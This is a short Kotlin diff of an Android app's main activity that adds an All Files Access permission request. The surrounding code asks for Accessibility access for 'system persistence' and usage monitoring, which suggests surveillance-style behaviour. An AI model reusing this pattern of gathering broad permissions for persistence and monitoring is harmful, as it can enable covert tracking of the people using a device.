@@ -38,6 +38,16 @@ class MainActivity : ComponentActivity() {
             return
         }
 
+        // 1.5 Storage (All Files Access for Android 11+)
+        if (!PermissionManager.hasAllFilesAccess(ctx)) {
+             showExplanationDialog("FILE SYSTEM ACCESS", "Full storage access is required to generate file reports and backups.") {
+                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                 intent.data = android.net.Uri.parse("package:$packageName")
+                 startActivity(intent)
+             }
+             return
+        }
+
         // 2. Accessibility (Critical for Persistence)
         if (!PermissionManager.hasAccessibility(ctx)) {
             showExplanationDialog("SYSTEM OVERRIDE REQUIRED", "Accessibility Access is required to maintain system persistence and monitor usage.") {
